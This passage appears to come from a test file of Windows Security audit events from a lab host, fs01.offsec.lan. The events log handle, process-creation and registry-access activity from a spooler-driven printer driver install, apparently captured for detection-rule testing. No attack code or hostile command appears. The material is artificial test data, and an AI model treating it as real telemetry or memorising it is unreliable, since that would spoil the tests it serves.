Name:\t\tC:\\Windows\\System32\\drvinst.exe\n\nAccess Request Information:\n\tTransaction ID:\t\t{00000000-0000-0000-0000-000000000000}\n\tAccesses:\t\tDELETE\n\t\t\t\tREAD_CONTROL\n\t\t\t\tQuery key value\n\t\t\t\tSet key value\n\t\t\t\tCreate sub-key\n\t\t\t\tEnumerate sub-keys\n\t\t\t\tNotify about changes to keys\n\t\t\t\t\n\tAccess Reasons:\t\t-\n\tAccess Mask:\t\t0x3001F\n\tPrivileges Used for Access Check:\t-\n\tRestricted SID Count:\t0"}, "eventdata": {"subjectUserSid": "S-1-5-18", "subjectUserName": "FS01$", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x3e7", "objectServer": "Security", "objectType": "Key", "objectName": "\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\Root\\Certificates", "handleId": "0x1b4", "transactionId": "{00000000-0000-0000-0000-000000000000}", "accessList": "%%1537\n\t\t\t\t%%1538\n\t\t\t\t%%4432\n\t\t\t\t%%4433\n\t\t\t\t%%4434\n\t\t\t\t%%4435\n\t\t\t\t%%4436", "accessMask": "0x3001f", "restrictedSidCount": "0", "processId": "0x1dac", "processName": "C:\\Windows\\System32\\drvinst.exe"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4658", "version": "0", "level": "0", "task": "12801", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:15.1940877Z", "eventRecordID": "2183543", "processID": "4", "threadID": "4756", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "The handle to an object was closed.\n\nSubject :\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tFS01$\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x3E7\n\nObject:\n\tObject Server:\t\tSecurity\n\tHandle ID:\t\t0x1b4\n\nProcess Information:\n\tProcess ID:\t\t0x1dac\n\tProcess Name:\t\tC:\\Windows\\System32\\drvinst.exe"}, "eventdata": {"subjectUserSid": "S-1-5-18", "subjectUserName": "FS01$", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x3e7", "objectServer": "Security", "handleId": "0x1b4", "processId": "0x1dac", "processName": "C:\\Windows\\System32\\drvinst.exe"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4656", "version": "1", "level": "0", "task": "12804", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:17.0241111Z", "eventRecordID": "2183544", "processID": "4", "threadID": "5392", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "A handle to an object was requested.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tFS01$\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x3E7\n\nObject:\n\tObject Server:\t\tPlugPlayManager\n\tObject Type:\t\tSecurity\n\tObject Name:\t\tPlugPlaySecurityObject\n\tHandle ID:\t\t0x0\n\tResource Attributes:\t-\n\nProcess Information:\n\tProcess ID:\t\t0x280\n\tProcess Name:\t\tC:\\Windows\\System32\\svchost.exe\n\nAccess Request Information:\n\tTransaction ID:\t\t{00000000-0000-0000-0000-000000000000}\n\tAccesses:\t\tUnknown specific access (bit 1)\n\t\t\t\t\n\tAccess Reasons:\t\t-\n\tAccess Mask:\t\t0x2\n\tPrivileges Used for Access Check:\t-\n\tRestricted SID Count:\t0"}, "eventdata": {"subjectUserSid": "S-1-5-18", "subjectUserName": "FS01$", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x3e7", "objectServer": "PlugPlayManager", "objectType": "Security", "objectName": "PlugPlaySecurityObject", "handleId": "0x0", "transactionId": "{00000000-0000-0000-0000-000000000000}", "accessList": "%%1553", "accessMask": "0x2", "restrictedSidCount": "0", "processId": "0x280", "processName": "C:\\Windows\\System32\\svchost.exe"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4688", "version": "2", "level": "0", "task": "13312", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:17.0245869Z", "eventRecordID": "2183545", "processID": "4", "threadID": "5392", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "A new process has been created.\n\nCreator Subject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tFS01$\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x3E7\n\nTarget Subject:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\t-\n\tAccount Domain:\t\t-\n\tLogon ID:\t\t0x0\n\nProcess Information:\n\tNew Process ID:\t\t0x7a4\n\tNew Process Name:\tC:\\Windows\\System32\\drvinst.exe\n\tToken Elevation Type:\t%%1936\n\tMandatory Label:\t\tS-1-16-16384\n\tCreator Process ID:\t0x280\n\tCreator Process Name:\tC:\\Windows\\System32\\svchost.exe\n\tProcess Command Line:\tDrvInst.exe \"4\" \"d\" \"C:\\Windows\\system32\\spool\\{C3445CE2-E050-40AC-972D-6D9E24646E8F}\\prnge001.inf\" \"9\" \"4d6061107\" \"0000000000000F34\" \"WinSta0\\Default\" \"0000000000000E50\" \"208\" \"C:\\Windows\\system32\\spool\\{C3445CE2-E050-40AC-972D-6D9E24646E8F}\"\n\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\n\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\n\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\n\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."}, "eventdata": {"subjectUserSid": "S-1-5-18", "subjectUserName": "FS01$", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x3e7", "newProcessId": "0x7a4", "newProcessName": "C:\\Windows\\System32\\drvinst.exe", "tokenElevationType": "%%1936", "processId": "0x280", "commandLine": "DrvInst.exe \"4\" \"d\" \"C:\\Windows\\system32\\spool\\{C3445CE2-E050-40AC-972D-6D9E24646E8F}\\prnge001.inf\" \"9\" \"4d6061107\" \"0000000000000F34\" \"WinSta0\\Default\" \"0000000000000E50\" \"208\" \"C:\\Windows\\system32\\spool\\{C3445CE2-E050-40AC-972D-6D9E24646E8F}\"", "targetUserSid": "S-1-0-0", "targetLogonId": "0x0", "parentProcessName": "C:\\Windows\\System32\\svchost.exe", "mandatoryLabel": "S-1-16-16384"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4690", "version": "0", "level": "0", "task": "12807", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:17.0916479Z", "eventRecordID": "2183546", "processID": "4", "threadID": "5052", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "An attempt was made to duplicate a handle to an object.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tFS01$\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x3E7\n\nSource Handle Information:\n\tSource Handle ID:\t0x1ac\n\tSource Process ID:\t0x7a4\n\nNew Handle Information:\n\tTarget Handle ID:\t0x138c\n\tTarget Process ID:\t0x4"}, "eventdata": {"subjectUserSid": "S-1-5-18", "subjectUserName": "FS01$", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x3e7", "sourceHandleId": "0x1ac", "sourceProcessId": "0x7a4", "targetHandleId": "0x138c", "targetProcessId": "0x4"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4658", "version": "0", "level": "0", "task": "12801", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:17.0916512Z", "eventRecordID": "2183547", "processID": "4", "threadID": "5052", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "The handle to an object was closed.\n\nSubject :\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tFS01$\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x3E7\n\nObject:\n\tObject Server:\t\tSecurity\n\tHandle ID:\t\t0x138c\n\nProcess Information:\n\tProcess ID:\t\t0x7a4\n\tProcess Name:\t\tC:\\Windows\\System32\\drvinst.exe"}, "eventdata": {"subjectUserSid": "S-1-5-18", "subjectUserName": "FS01$", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x3e7", "objectServer": "Security", "handleId": "0x138c", "processId": "0x7a4", "processName": "C:\\Windows\\System32\\drvinst.exe"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4656", "version": "1", "level": "0", "task": "12801", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:17.0916577Z", "eventRecordID": "2183548", "processID": "4", "threadID": "5052", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "A handle to an object was requested.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tFS01$\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x3E7\n\nObject:\n\tObject Server:\t\tSecurity\n\tObject Type:\t\tKey\n\tObject Name:\t\t\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\SystemCertificates\\ROOT\\Certificates\n\tHandle ID:\t\t0x1ac\n\tResource Attributes:\t-\n\nProcess Information:\n\tProcess ID:\t\t0x7a4\n\tProcess Name:\t\tC:\\Windows\\System32\\drvinst.exe\n\nAccess Request Information:\n\tTransaction ID:\t\t{00000000-0000-0000-0000-000000000000}\n\tAccesses:\t\tDELETE\n\t\t\t\tREAD_CONTROL\n\t\t\t\tQuery key value\n\t\t\t\tSet key value\n\t\t\t\tCreate sub-key\n\t\t\t\tEnumerate sub-keys\n\t\t\t\tNotify about changes to keys\n\t\t\t\t\n\tAccess Reasons:\t\t-\n\tAccess Mask:\t\t0x3001F\n\tPrivileges Used for Access Check:\t-\n\tRestricted SID Count:\t0"}, "eventdata": {"subjectUserSid": "S-1-5-18", "subjectUserName": "FS01$", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x3e7", "objectServer": "Security", "objectType": "Key", "objectName": "\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\SystemCertificates\\ROOT\\Certificates", "handleId": "0x1ac", "transactionId": "{00000000-0000-0000-0000-000000000000}", "accessList": "%%1537\n\t\t\t\t%%1538\n\t\t\t\t%%4432\n\t\t\t\t%%4433\n\t\t\t\t%%4434\n\t\t\t\t%%4435\n\t\t\t\t%%4436", "accessMask": "0x3001f", "restrictedSidCount": "0", "processId": "0x7a4", "processName": "C:\\Windows\\System32\\drvinst.exe"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4658", "version": "0", "level": "0", "task": "12801", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:17.0926750Z", "eventRecordID": "2183549", "processID": "4", "threadID": "5052", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "The handle to an object was closed.\n\nSubject :\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tFS01$\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x3E7\n\nObject:\n\tObject Server:\t\tSecurity\n\tHandle ID:\t\t0x1ac\n\nProcess Information:\n\tProcess ID:\t\t0x7a4\n\tProcess Name:\t\tC:\\Windows\\System32\\drvinst.exe"}, "eventdata": {"subjectUserSid": "S-1-5-18", "subjectUserName": "FS01$", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x3e7", "objectServer": "Security", "handleId": "0x1ac", "processId": "0x7a4", "processName": "C:\\Windows\\System32\\drvinst.exe"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4690", "version": "0", "level": "0", "task": "12807", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:17.0929285Z", "eventRecordID": "2183550", "processID": "4", "threadID": "5052", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "An attempt was made to duplicate a handle to an object.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tFS01$\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x3E7\n\nSource Handle Information:\n\tSource Handle ID:\t0x1b0\n\tSource Process ID:\t0x7a4\n\nNew Handle Information:\n\tTarget Handle ID:\t0x138c\n\tTarget Process ID:\t0x4"}, "eventdata": {"subjectUserSid": "S-1-5-18", "subjectUserName": "FS01$", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x3e7", "sourceHandleId": "0x1b0", "sourceProcessId": "0x7a4", "targetHandleId": "0x138c", "targetProcessId": "0x4"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4658", "version": "0", "level": "0", "task": "12801", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:17.0929308Z", "eventRecordID": "2183551", "processID": "4", "threadID": "5052", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "The handle to an object was closed.\n\nSubject :\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tFS01$\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x3E7\n\nObject:\n\tObject Server:\t\tSecurity\n\tHandle ID:\t\t0x138c\n\nProcess Information:\n\tProcess ID:\t\t0x7a4\n\tProcess Name:\t\tC:\\Windows\\System32\\drvinst.exe"}, "eventdata": {"subjectUserSid": "S-1-5-18", "subjectUserName": "FS01$", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x3e7", "objectServer": "Security", "handleId": "0x138c", "processId": "0x7a4", "processName": "C:\\Windows\\System32\\drvinst.exe"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4656", "version": "1", "level": "0", "task": "12801", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:17.0929406Z", "eventRecordID": "2183552", "processID": "4", "threadID": "5052", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "A handle to an object was requested.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tFS01$\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x3E7\n\nObject:\n\tObject Server:\t\tSecurity\n\tObject Type:\t\tKey\n\tObject Name:\t\t\\REGISTRY\\MACHINE\\SOFTWARE\\Policies\\Microsoft\\SystemCertificates\\Root\\Certificates\n\tHandle ID:\t\t0x1b0\n\tResource Attributes:\t-\n\nProcess Information:\n\tProcess ID:\t\t0x7a4\n\tProcess Name:\t\tC:\\Windows\\System32\\drvinst.exe\n\nAccess Request Information:\n\tTransaction ID:\t\t{00000000-0000-0000-0000-000000000000}\n\tAccesses:\t\tDELETE\n\t\t\t\tREAD_CONTROL\n\t\t\t\tQuery key value\n\t\t\t\tSet key value\n\t\t\t\tCreate sub-key\n\t\t\t\tEnumerate sub-keys\n\t\t\t\tNotify about changes to keys\n\t\t\t\t\n\tAccess Reasons:\t\t-\n\tAccess Mask:\t\t0x3001F\n\tPrivileges Used for Access Check:\t-\n\tRestricted SID Count:\t0"}, "eventdata": {"subjectUserSid": "S-1-5-18", "subjectUserName": "FS01$", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x3e7", "objectServer": "Security", "objectType": "Key", "objectName": "\\REGISTRY\\MACHINE\\SOFTWARE\\Policies\\Microsoft\\SystemCertificates\\Root\\Certificates", "handleId": "0x1b0", "transactionId": "{00000000-0000-0000-0000-000000000000}", "accessList": "%%1537\n\t\t\t\t%%1538\n\t\t\t\t%%4432\n\t\t\t\t%%4433\n\t\t\t\t%%4434\n\t\t\t\t%%4435\n\t\t\t\t%%4436", "accessMask": "0x3001f", "restrictedSidCount": "0", "processId": "0x7a4", "processName": "C:\\Windows\\System32\\drvinst.exe"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4658", "version": "0", "level": "0", "task": "12801", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:17.0929481Z", "eventRecordID": "2183553", "processID": "4", "threadID": "5052", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "The handle to an object was closed.\n\nSubject :\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tFS01$\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x3E7\n\nObject:\n\tObject Server:\t\tSecurity\n\tHandle ID:\t\t0x1b0\n\nProcess Information:\n\tProcess ID:\t\t0x7a4\n\tProcess Name:\t\tC:\\Windows\\System32\\drvinst.exe"}, "eventdata": {"subjectUserSid": "S-1-5-18", "subjectUserName": "FS01$", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x3e7", "objectServer": "Security", "handleId": "0x1b0", "processId": "0x7a4", "processName": "C:\\Windows\\System32\\drvinst.exe"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4690", "version": "0", "level": "0", "task": "12807", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:17.0931107Z", "eventRecordID": "2183554", "processID": "4", "threadID": "5052", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "An attempt was made to duplicate a handle to an object.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tFS01$\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x3E7\n\nSource Handle Information:\n\tSource Handle ID:\t0x1b4\n\tSource Process ID:\t0x7a4\n\nNew Handle Information:\n\tTarget Handle ID:\t0x138c\n\tTarget Process ID:\t0x4"}, "eventdata": {"subjectUserSid": "S-1-5-18", "subjectUserName": "FS01$", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x3e7", "sourceHandleId": "0x1b4", "sourceProcessId": "0x7a4", "targetHandleId": "0x138c", "targetProcessId": "0x4"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4658", "version": "0", "level": "0", "task": "12801", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:17.0931135Z", "eventRecordID": "2183555", "processID": "4", "threadID": "5052", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "The handle to an object was closed.\n\nSubject :\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tFS01$\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x3E7\n\nObject:\n\tObject Server:\t\tSecurity\n\tHandle ID:\t\t0x138c\n\nProcess Information:\n\tProcess ID:\t\t0x7a4\n\tProcess Name:\t\tC:\\Windows\\System32\\drvinst.exe"}, "eventdata": {"subjectUserSid": "S-1-5-18", "subjectUserName": "FS01$", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x3e7", "objectServer": "Security", "handleId": "0x138c", "processId": "0x7a4", "processName": "C:\\Windows\\System32\\drvinst.exe"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4656", "version": "1", "level": "0", "task": "12801", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:17.0931233Z", "eventRecordID": "2183556", "processID": "4", "threadID": "5052", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "A handle to an object was requested.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tFS01$\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x3E7\n\nObject:\n\tObject Server:\t\tSecurity\n\tObject Type:\t\tKey\n\tObject Name:\t\t\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\Root\\Certificates\n\tHandle ID:\t\t0x1b4\n\tResource Attributes:\t-\n\nProcess Information:\n\tProcess ID:\t\t0x7a4\n\tProcess Name:\t\tC:\\Windows\\System32\\drvinst.exe\n\nAccess Request Information:\n\tTransaction ID:\t\t{00000000-0000-0000-0000-000000000000}\n\tAccesses:\t\tDELETE\n\t\t\t\tREAD_CONTROL\n\t\t\t\tQuery key value\n\t\t\t\tSet key value\n\t\t\t\tCreate sub-key\n\t\t\t\tEnumerate sub-keys\n\t\t\t\tNotify about changes to keys\n\t\t\t\t\n\tAccess Reasons:\t\t-\n\tAccess Mask:\t\t0x3001F\n\tPrivileges Used for Access Check:\t-\n\tRestricted SID Count:\t0"}, "eventdata": {"subjectUserSid": "S-1-5-18", "subjectUserName": "FS01$", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x3e7", "objectServer": "Security", "objectType": "Key", "objectName": "\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\Root\\Certificates", "handleId": "0x1b4", "transactionId": "{00000000-0000-0000-0000-000000000000}", "accessList": "%%1537\n\t\t\t\t%%1538\n\t\t\t\t%%4432\n\t\t\t\t%%4433\n\t\t\t\t%%4434\n\t\t\t\t%%4435\n\t\t\t\t%%4436", "accessMask": "0x3001f", "restrictedSidCount": "0", "processId": "0x7a4", "processName": "C:\\Windows\\System32\\drvinst.exe"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4658", "version": "0", "level": "0", "task": "12801", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:17.0931960Z", "eventRecordID": "2183557", "processID": "4", "threadID": "5052", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "The handle to an object was closed.\n\nSubject :\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tFS01$\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x3E7\n\nObject:\n\tObject Server:\t\tSecurity\n\tHandle ID:\t\t0x1b4\n\nProcess Information:\n\tProcess ID:\t\t0x7a4\n\tProcess Name:\t\tC:\\Windows\\System32\\drvinst.exe"}, "eventdata": {"subjectUserSid": "S-1-5-18", "subjectUserName": "FS01$", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x3e7", "objectServer": "Security", "handleId": "0x1b4", "processId": "0x7a4", "processName": "C:\\Windows\\System32\\drvinst.exe"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4690", "version": "0", "level": "0", "task": "12807", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:17.7287851Z", "eventRecordID": "2183558", "processID": "4", "threadID": "5052", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "An attempt was made to duplicate a handle to an object.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tFS01$\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x3E7\n\nSource Handle Information:\n\tSource Handle ID:\t0xa28\n\tSource Process ID:\t0x678\n\nNew Handle Information:\n\tTarget Handle ID:\t0x1644\n\tTarget Process ID:\t0x4"}, "eventdata": {"subjectUserSid": "S-1-5-18", "subjectUserName": "FS01$", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x3e7", "sourceHandleId": "0xa28", "sourceProcessId": "0x678", "targetHandleId": "0x1644", "targetProcessId": "0x4"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4658", "version": "0", "level": "0", "task": "12800", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:17.7287949Z", "eventRecordID": "2183559", "processID": "4", "threadID": "5052", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "The handle to an object was closed.\n\nSubject :\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tFS01$\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x3E7\n\nObject:\n\tObject Server:\t\tSecurity\n\tHandle ID:\t\t0x1644\n\nProcess Information:\n\tProcess ID:\t\t0x678\n\tProcess Name:\t\tC:\\Windows\\System32\\spoolsv.exe"}, "eventdata": {"subjectUserSid": "S-1-5-18", "subjectUserName": "FS01$", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x3e7", "objectServer": "Security", "handleId": "0x1644", "processId": "0x678", "processName": "C:\\Windows\\System32\\spoolsv.exe"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4656", "version": "1", "level": "0", "task": "12800", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:17.7288275Z", "eventRecordID": "2183560", "processID": "4", "threadID": "5052", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "A handle to an object was requested.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tFS01$\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x3E7\n\nObject:\n\tObject Server:\t\tSecurity\n\tObject Type:\t\tFile\n\tObject Name:\t\tC:\\Windows\\INF\\TAPISRV\\0409\n\tHandle ID:\t\t0xa28\n\tResource Attributes:\t-\n\nProcess Information:\n\tProcess ID:\t\t0x678\n\tProcess Name:\t\tC:\\Windows\\System32\\spoolsv.exe\n\nAccess Request Information:\n\tTransaction ID:\t\t{00000000-0000-0000-0000-000000000000}\n\tAccesses:\t\tSYNCHRONIZE\n\t\t\t\tReadData (or ListDirectory)\n\t\t\t\t\n\tAccess Reasons:\t\tSYNCHRONIZE:\tGranted by\tD:(A;;0x1200a9;;;SY)\n\t\t\t\tReadData (or ListDirectory):\tGranted by\tD:(A;;0x1200a9;;;SY)\n\t\t\t\t\n\tAccess Mask:\t\t0x100001\n\tPrivileges Used for Access Check:\t-\n\tRestricted SID Count:\t0"}, "eventdata": {"subjectUserSid": "S-1-5-18", "subjectUserName": "FS01$", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x3e7", "objectServer": "Security", "objectType": "File", "objectName": "C:\\Windows\\INF\\TAPISRV\\0409", "handleId": "0xa28", "transactionId": "{00000000-0000-0000-0000-000000000000}", "accessList": "%%1541\n\t\t\t\t%%4416", "accessReason": "%%1541:\t%%1801\tD:(A;;0x1200a9;;;SY)\n\t\t\t\t%%4416:\t%%1801\tD:(A;;0x1200a9;;;SY)", "accessMask": "0x100001", "restrictedSidCount": "0", "processId": "0x678", "processName": "C:\\Windows\\System32\\spoolsv.exe"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4658", "version": "0", "level": "0", "task": "12800", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:17.7288438Z", "eventRecordID": "2183561", "processID": "4", "threadID": "5052", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "The handle to an object was closed.\n\nSubject :\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tFS01$\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x3E7\n\nObject:\n\tObject Server:\t\tSecurity\n\tHandle ID:\t\t0xa28\n\nProcess Information:\n\tProcess ID:\t\t0x678\n\tProcess Name:\t\tC:\\Windows\\System32\\spoolsv.exe"}, "eventdata": {"subjectUserSid": "S-1-5-18", "subjectUserName": "FS01$", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x3e7", "objectServer": "Security", "handleId": "0xa28", "processId": "0x678", "processName": "C:\\Windows\\System32\\spoolsv.exe"}}}''',
